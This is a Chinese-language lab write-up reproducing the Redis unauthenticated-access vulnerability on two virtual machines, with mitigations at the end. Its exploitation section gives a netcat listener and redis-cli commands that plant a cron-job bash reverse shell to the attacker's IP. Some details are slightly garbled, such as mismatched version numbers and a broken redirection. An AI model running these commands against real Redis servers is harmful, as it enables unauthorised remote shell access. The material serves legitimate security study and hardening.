Redis未授权访问漏洞复现与利用
发表于 2019-12-29| 更新于 2021-03-20|漏洞复现
阅读量:

漏洞简介以及危害

什么是redis未授权访问漏洞

Redis默认情况下，会绑定0.0.0.0:6379，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源ip访问等，这样将会将Redis暴漏到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。攻击者在未授权访问Redis的情况下，利用Redis自身提供的config命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的/root/.ssh文件的authotrized_keys文件中，进行可以使用对应私钥直接使用ssh服务登录目标服务器。
简单说，漏洞的产生条件有以下两点：
①redis绑定在0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴漏在公网；
②没有设置密码认证（一般为空），可以避免远程登录redis服务。

漏洞的危害

①攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以执行flushall来清空所有数据；
②攻击者可以通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件；
③最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SHH公钥文件，直接通过ssh登录受害服务器。

漏洞复现

下载并安装测试用的Redis
wget http://download.redis.io/releases/redis-2.8.17.tar.gz
（也可以直接下载：http://distflies.macports.org/redis/）
解压安装包：tar xzf redis-3.2.8.tar.gz
进行redis目录：cd redis-3.2.8
安装：make
make结束后，进入src目录：cd src
将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次进入安装目录了）
返回目录redis-3.2.8，将redis.conf拷贝到/etc目录下
使用/etc目录下的redis.conf文件中的配置启动redis服务
服务启动成功，我们克隆这台虚拟机，一台作为攻击机，一台作为靶机。
攻击机IP：192.168.8.8

靶机IP：192.168.8.7

启动redis服务进程后，就可以使用攻击机redis-cli和靶机的redis服务交互了.

利用crontab反弹shell

在攻击者服务器上监听一个端口（未被占用的任意端口）：
nc -lvn 4444
连接redis，写入反弹shell
redis-cli -h 192.168.8.7
set xxx "\n\n*/1****/bin/bash -i>7/dev/tcp/192.168.8.8/4444 0>&1\n\n"
config set dir /var/spool/
config set dbfilename root
save

过一分钟左右就可以收到shell。

解决方案

绑定IP

请在redis.conf文件找到如下配置：

把#bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问的IP地址，表示只允许该IP进行访问，这种情况下，我们启动redis服务器的时候不能再用：redis-server，改为reidis-server path/redis.conf即在启动的时候指定需要加载的配置文件，其中path/是你上面修改的reids配置文件所在目录，这个方法有一点不太好，难免有多台机器访问一个redis服务。

设置密码，以提供远程登录

代开redis.conf配置文件，找到requirepass，然后修改如下；
requirepass 123456
设置密码以后发现可以登录，但是无法执行命令了。
